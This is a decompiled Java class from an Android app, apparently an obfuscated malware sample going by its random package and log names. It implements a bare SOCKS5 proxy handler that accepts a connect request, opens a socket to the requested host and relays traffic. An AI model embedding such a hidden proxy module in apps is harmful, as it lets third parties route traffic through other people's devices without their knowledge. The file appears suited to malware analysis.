package wocwvy.czyxoxmbauu.slsa.kuv;

import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.kuv.a */
/* JADX INFO: loaded from: classes.dex */
public class RunnableC0026a implements Runnable {

    /* JADX INFO: renamed from: a */
    private Socket f435a;

    /* JADX INFO: renamed from: b */
    private String f436b = getClass().getName();

    /* JADX INFO: renamed from: c */
    private int f437c = 102400;

    public RunnableC0026a(Socket socket) {
        this.f435a = socket;
    }

    /* JADX INFO: renamed from: a */
    public int m283a(byte b) {
        return b & 255;
    }

    @Override // java.lang.Runnable
    public void run() {
        try {
            try {
                try {
                    InputStream inputStream = this.f435a.getInputStream();
                    OutputStream outputStream = this.f435a.getOutputStream();
                    byte[] bArr = new byte[this.f437c];
                    inputStream.read(bArr, 0, 3);
                    outputStream.write(new byte[]{5, 0});
                    outputStream.flush();
                    inputStream.read(bArr, 0, 10);
                    String str = m283a(bArr[4]) + "." + m283a(bArr[5]) + "." + m283a(bArr[6]) + "." + m283a(bArr[7]);
                    int iM283a = (m283a(bArr[8]) * 256) + m283a(bArr[9]);
                    Log.e("viwbhhtpqlxexwwm", "Connected to " + str + ":" + iM283a);
                    Socket socket = new Socket(str, iM283a);
                    InputStream inputStream2 = socket.getInputStream();
                    OutputStream outputStream2 = socket.getOutputStream();
                    byte[] bArr2 = new byte[4];
                    byte[] address = socket.getLocalAddress().getAddress();
                    int localPort = socket.getLocalPort();
                    outputStream.write(new byte[]{5, 0, 0, 1, address[0], address[1], address[2], address[3], (byte) (localPort >> 8), (byte) (localPort & 255)}, 0, 10);
                    outputStream.flush();
                    new C0027b(inputStream2, outputStream).start();
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    while (true) {
                        int i = inputStream.read(bArr, 0, this.f437c);
                        if (i <= 0) {
                            break;
                        }
                        outputStream2.write(bArr, 0, i);
                        byteArrayOutputStream.write(bArr, 0, i);
                        outputStream2.flush();
                    }
                    if (this.f435a != null) {
                        this.f435a.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    if (this.f435a != null) {
                        this.f435a.close();
                    }
                }
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        } catch (Throwable th) {
            try {
                if (this.f435a == null) {
                    throw th;
                }
                this.f435a.close();
                throw th;
            } catch (IOException e3) {
                e3.printStackTrace();
                throw th;
            }
        }
    }
}
